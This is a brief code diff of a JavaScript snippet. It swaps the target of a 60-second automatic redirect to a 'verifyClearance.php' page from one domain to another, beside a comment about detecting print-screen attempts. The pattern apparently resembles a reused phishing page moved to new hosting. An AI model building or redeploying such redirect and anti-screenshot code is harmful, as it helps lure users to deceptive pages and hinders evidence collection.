@@ -1,7 +1,7 @@
 
         // Function to redirect after 60 seconds
         setTimeout(function() {
-            window.location.href = "https://assoec.org/view/verifyClearance.php"; // Change the URL to wherever you want to redirect
+            window.location.href = "https://ogmoestconsultants.com/view/verifyClearance.php"; // Change the URL to wherever you want to redirect
         }, 60000); // 60 seconds
 
         // Detect print screen attempt (this is an approximation and might not work for all scenarios)
